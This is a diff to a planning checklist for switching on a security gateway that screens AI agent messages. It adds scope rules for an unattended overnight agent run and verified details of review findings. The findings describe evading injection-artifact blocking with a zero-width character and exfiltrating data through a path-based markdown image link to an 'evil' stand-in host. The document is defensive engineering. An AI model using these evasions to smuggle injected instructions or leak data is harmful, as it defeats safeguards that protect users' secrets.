@@ -76,6 +76,53 @@ you flip the switch, and are far cheaper to fix before that than after.
 
 ---
 
+## 🌙 THE OVERNIGHT RUN — scope, order, and the autonomy boundary
+
+**Andre is NOT available. Nothing in this run may wait on him.** Anything that needs a decision, a
+credential, a human hand, or reaches a real counterparty is OUT OF SCOPE — do it in the morning.
+
+### ⛔ OUT OF SCOPE — do not attempt, do not "just try"
+| | why |
+|---|---|
+| **Part F (the live test)** | Needs two daemons, a real relay, and killing a process by hand. A green tick from a faked version is worse than no tick. |
+| **The `latest` promotion** | Operator-run, always. Andre's explicit go. Never automate it. |
+| **A5 (PII whitelist seed)** | **BLOCKED** — not implementable as written; needs Andre to pick 1/2/3. |
+| **B1, if still undecided** | The startup policy IS the shape of A1/A3. Recommendation is on the table; if there is no answer by run time, implement **refuse-to-start** behind the A3 flag and SAY SO in the report. |
+| **Publishing the cascade** | A `daemon + cli + connect + gateway` cascade is needed at the end. **Prepare it, tag NOTHING.** Load `/cello-publish` in the morning. |
+
+### ✅ IN SCOPE, in dependency order — each ends with the full gate + a commit
+1. **C4** (RE2 discipline) — smallest, isolated, and it is a *guard* the later fixes benefit from.
+2. **C1** (strip-before-artifact ordering) — one-line reorder in `exfil.ts`, big security win.
+3. **C3** (path-based image exfil) — same file as C1; do them together, one gate.
+4. **C5** (secrets cap → block, never leak the overflow) — `secrets.ts`.
+5. **C2** (inbound redact-without-content must fail CLOSED) — `session-node-manager.ts:3400`. **Touches
+   the daemon, not the gateway** — separate commit, separate gate.
+6. **C7** (language allowlist ⇒ opt-in; unset = NOT COMPOSED) — `screen/inbound.ts` + `detect/language.ts`.
+   Log INACTIVE at boot.
+7. **C6** (`verifyChain` at boot; refuse to start on a broken chain) — depends on nothing, but do it
+   after the detectors so a chain refusal cannot mask a detector failure while you are iterating.
+8. **A3** (the kill switch: `CELLO_SECURITY=off` → `PassthroughGatewayClient`). **Before A1. Always.**
+9. **A4** (real defaults for the socket / config-db / request-log under `~/.cello/`).
+10. **A1 + A2 + E1 — IN ONE COMMIT.** Spawn the sidecar, pass the client, kill the child on shutdown,
+    **and flip the docs in the same change.** `SKILL.md`/`README` currently say content is screened —
+    **false today, true the moment A1 lands.** They must never be out of step, in either direction.
+11. **B2 (the benchmark)** — measure, publish the table here, propose a deadline. **Do not set it
+    unilaterally**; leave the number as a recommendation.
+12. **D1′** — verify the `flagId` round trip across the real daemon↔sidecar boundary.
+
+### The rules for the run
+- **The full gate after EVERY item**: `pnpm test` → `lint` → `typecheck` → `build`. Never batch.
+- **Verify every claim against the source before acting on it.** This document was wrong once already
+  (D1), and the M9 DoD is wrong in the other direction (C7). *Read the code first.*
+- **A failing test is fixed, never attributed.** If something goes red that you did not touch, trace
+  it — do not re-run hoping for green, and do not call it flaky.
+- **If an item turns out to be a false alarm — STOP, journal it, move on.** Do not invent work to fill
+  the night.
+- **Stop and report rather than guess** on anything that reaches a counterparty, a bill, or a publish.
+- **Commit after every item** with the finding and the fix in the message. The commit is the report.
+
+---
+
 ## Part A — wire it on
 
 - [ ] **A1. Spawn the sidecar and pass the client.** In `core/daemon/src/bin/cello-daemon.ts`, call
@@ -92,10 +139,27 @@ you flip the switch, and are far cheaper to fix before that than after.
       real conversation you will want it to already exist.
 - [ ] **A4. Paths under `~/.cello/`.** `CELLO_GATEWAY_SOCKET` (required), `CELLO_GATEWAY_CONFIG_DB`,
       `CELLO_GATEWAY_REQUEST_LOG`. Give them real defaults; do not make the operator set env vars.
-- [ ] **A5. Seed the PII whitelist from the registered identity.** `M9-OUT-002`'s entire premise is
-      *"a whitelisted own-email passes silently."* Today the whitelist is a comma-separated env var
-      (`CELLO_GATEWAY_PII_WHITELIST`). **Unseeded, the operator's own email address gets flagged on
-      their first message** — the worst possible first impression of the feature.
+- [ ] **A5. Seed the PII whitelist — ⛔ NOT IMPLEMENTABLE AS WRITTEN. NEEDS ANDRE'S DECISION.**
+      `M9-OUT-002`'s premise is *"a whitelisted own-email passes silently."* Unseeded, **the operator's
+      own email is flagged on their very first message** — the worst possible first impression.
+
+      **But "seed it from the registered identity" CANNOT BE DONE: the daemon has no email.** Verified
+      2026-07-13 — no email column, nothing in the identity store. That is BY DESIGN, not an oversight:
+      **no PII in the directory** (email is hash-only there); the **portal** holds the recoverable copy.
+      There is nothing for the daemon to seed *from*. An agent that takes this item literally will go
+      looking in the directory for an email that does not exist.
+
+      **Pick one (Andre):**
+      1. **Operator sets it explicitly** — `cello config pii-whitelist add <email>`, prompted on first
+         `cello login`. Simple, no new dependency, no PII anywhere new. *Recommended.*
+      2. **Portal fetch** — the portal has the KMS-recoverable email; the daemon pulls it after portal
+         login. Truest to A5's intent, but adds a portal round-trip to daemon startup and puts the
+         operator's email on the daemon's disk.
+      3. **Ship unseeded and accept the first-message flag** — the operator hits ONE warn, answers
+         `allow_always`, done. Cheapest; leans on the (working) governance re-send. Slightly ugly first
+         impression, zero new machinery.
+
+      **Until this is decided, A5 is BLOCKED and must not be attempted.**
 
 ## Part B — decide the failure policy BEFORE flipping (not after)
 
@@ -142,31 +206,53 @@ you flip the switch, and are far cheaper to fix before that than after.
 
 ## Part C — the Fable-5 review's findings (`M9-SECURITY-REVIEW-FABLE5.md`)
 
+> **✅ ALL SIX VERIFIED AGAINST THE SOURCE, 2026-07-13.** Unlike D1, every one of these is REAL, and
+> the file:line for each is given below. The Fable-5 review was accurate. Fix them; do not re-litigate.
+
 Findings #1 (inert layer) and #2 (plaintext stores) are tracked elsewhere — #1 is Part A of this
 document, #2 is `DOD-CRYPTO-AT-REST-1` in [[M8C-DEFINITION-OF-DONE]]. **The remaining seven are new
 work that belongs to this switch-on**, because flipping the switch is what makes them exploitable.
 
 - [ ] **C1. MEDIUM — outbound injection-artifact BLOCK is evadable with a zero-width character.**
-      The block check runs BEFORE the invisible-strip on the outbound path. **Inbound has the right
-      order; outbound inverts it.** So an artifact laced with a zero-width char sails through the
-      block and is then stripped clean on the way out. This is an ordering bug, and the fix is to
-      make outbound match inbound.
-- [ ] **C2. MEDIUM — inbound `redact`-without-content fails OPEN.** When a redact verdict arrives
-      with no replacement content, the inbound seam **delivers the ORIGINAL** — while the outbound
-      seam fails CLOSED on the identical case. A fail-open default pointing the wrong way, in the
-      layer whose job is to be the floor. Latent today; a live detector bug makes it real.
-- [ ] **C3. MEDIUM — path-based image exfil is not caught.** The image-exfil check only inspects
-      `?`-query URLs, so `![](http://evil/<data>)` evades both it and the entropy charset check.
-- [ ] **C4. MEDIUM — outbound exfil patterns use native `RegExp`, not RE2.** They match against
-      **adversary-controlled content** outside the project's own ReDoS discipline. Latent
-      DoS → forced-timeout, and no guard stops someone adding an unsafe pattern later. Everything
-      else in the detectors is RE2; this is the one hole in that discipline.
+      ✅ **CONFIRMED — `core/gateway/src/detect/exfil.ts:55-70`.** Step 1 runs `findInjectionArtifact`
+      on the RAW text and blocks; step 2 then runs `stripInvisible`. So `sys\u200btem:` misses the
+      anchored artifact patterns in step 1, gets cleaned to `system:` in step 2, and **is sent**.
+      **Fix:** strip invisible FIRST, then test for artifacts (make outbound match inbound's order).
+      **Done when:** a test sends a zero-width-laced artifact and gets `block`, not `redact`.
+- [ ] **C2. MEDIUM — inbound `redact`-without-content fails OPEN.**
+      ✅ **CONFIRMED — `core/daemon/src/session-node-manager.ts:3400`:**
+      `disposition === "redact" && content !== undefined ? verdict.content : content` — i.e. a redact
+      with no content **delivers the ORIGINAL**. The outbound seam does the opposite on the identical
+      case (`session-content-handlers.ts:212` treats it as a BLOCK, with a comment calling it "the one
+      place M9 could fail OPEN"). The two seams disagree, and the inbound one points the wrong way.
+      **Fix:** make inbound fail CLOSED, mirroring outbound. **Done when:** a redact verdict with no
+      content drops the message and logs, rather than delivering the unredacted original.
+- [ ] **C3. MEDIUM — path-based image exfil is not caught.**
+      ✅ **CONFIRMED — `core/gateway/src/detect/exfil.ts:75`:** `if (url.includes("?"))`. Only
+      query-string URLs are neutralized, so `![](http://evil/<base64-data>)` walks past.
+      **Fix:** neutralize any image URL whose path carries a data-shaped segment, not just `?`-queries.
+      **Done when:** a path-carried payload is neutralized.
+- [ ] **C4. MEDIUM — outbound exfil patterns use native `RegExp`, not RE2.**
+      ✅ **CONFIRMED — `core/gateway/src/detect/exfil.ts:34`:** `const ARTIFACT_PATTERNS: RegExp[]`,
+      while `pii.ts`, `sanitize.ts`, `injection-patterns.ts` and `secrets.ts` ALL go through
+      `linear-regex`. `exfil.ts` is the single hole in the project's own ReDoS discipline — and it
+      matches against adversary-controlled content. **Fix:** route it through `linear-regex` like its
+      siblings. **Done when:** no native `RegExp` remains in `detect/`, and a lint/test guard stops
+      the next one being added.
 - [ ] **C5. LOW — secret redaction caps at 1000 matches per rule, and outbound has no size cap.**
-      A crafted high-volume message overflows the cap and **the overflow secrets leak**.
-- [ ] **C6. LOW — neither store calls `verifyChain` at gateway boot.** A tampered local config DB is
-      trusted until Phase-2 attestation exists. **This and `DOD-CRYPTO-AT-REST-1` are two halves of
-      one hole — fixing only one leaves it open** (plaintext on disk is what makes the tamper
-      trivial; no boot-time verify is what makes it undetected).
+      ✅ **CONFIRMED — `core/gateway/src/detect/secrets.ts:86`:** `while (offset < text.length &&
+      guard++ < 1000)`. Past 1000 matches the loop stops and **the overflow secrets are emitted
+      verbatim.** There is no outbound size cap to bound it (the daemon's 1 MB `MAX_CONTENT_BYTES` cap
+      is the only ceiling, and 1 MB holds far more than 1000 keys). **Fix:** on hitting the cap, do not
+      fall through to send — BLOCK (or truncate-and-block). Never emit the remainder.
+      **Done when:** a message with >1000 secrets is blocked, not partially redacted.
+- [ ] **C6. LOW — neither store calls `verifyChain` at gateway boot.**
+      ✅ **CONFIRMED:** `verifyChain()` EXISTS (`config/config-store.ts:211`, and on the record store)
+      but is **never called** from `bin/`, `server.ts` or `spawn.ts`. A tampered local config DB is
+      trusted. **This and `DOD-CRYPTO-AT-REST-1` are two halves of ONE hole** — plaintext on disk makes
+      the tamper trivial; no boot-time verify makes it undetected. Fixing one alone leaves it open.
+      **Fix:** call `verifyChain()` on both stores at gateway boot; refuse to start on a broken chain.
+      **Done when:** a hand-edited config row makes the gateway refuse to start, loudly.
 - [ ] **C7. DECIDED (Andre, 2026-07-13) — the language allowlist is OPT-IN: EMPTY ⇒ INACTIVE.**
       The IN-003 allowlist is currently LIVE and blocking — it terminally drops **all confident
       non-Latin inbound**, while the M9 DoD claims it is "NOT yet wired live." The DoD is wrong; the
@@ -235,6 +321,16 @@ work that belongs to this switch-on**, because flipping the switch is what makes
       `.claude/CLAUDE.md`: no tool description may claim screening is active while the daemon runs
       passthrough.) `cello_contact_set_tier`'s description carries the same disclaimer and needs the
       same edit.
+
+## ⛔ Part F — CANNOT BE DONE UNATTENDED. Do not attempt it in an overnight run.
+
+**Everything below needs a human at the wheel**: two real daemons, two agents, a real relay, and
+F6 is literally *kill the gateway process mid-session*. Its precondition is also that the publish
+cascade is **published AND exercised** — which is a separate, human-run step.
+
+**An overnight run stops at the end of Part E and reports.** Part F is a next-morning job, done
+together. Attempting it unattended produces a green tick that means nothing, which is worse than not
+running it.
 
 ## Part F — the live test (two real daemons, two agents, real relay)
 
